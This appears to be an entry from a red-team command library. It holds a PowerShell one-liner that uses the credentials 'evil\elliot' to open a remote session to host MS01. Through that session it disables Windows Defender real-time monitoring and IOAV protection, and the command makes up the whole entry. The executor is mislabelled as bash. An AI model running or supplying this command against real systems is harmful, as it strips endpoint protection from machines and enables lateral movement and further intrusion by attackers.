---
id: f5c79018-1470-4a17-acab-1a596d058b99
name: Create a Nested PS Session and disable AV
type: command
executor: bash
data: '$sess = New-PSSession -ComputerName MS01 -Credential evil\elliot

  Invoke-Command -Session $sess -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring
  $true -DisableIOAVProtection $true }

  '
output: null
created_at: '2020-07-15T19:05:44.362993+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
---

# Create a Nested PS Session and disable AV

```bash
$sess = New-PSSession -ComputerName MS01 -Credential evil\elliot
Invoke-Command -Session $sess -ScriptBlock { Set-MpPreference -DisableRealtimeMonitoring $true -DisableIOAVProtection $true }

```


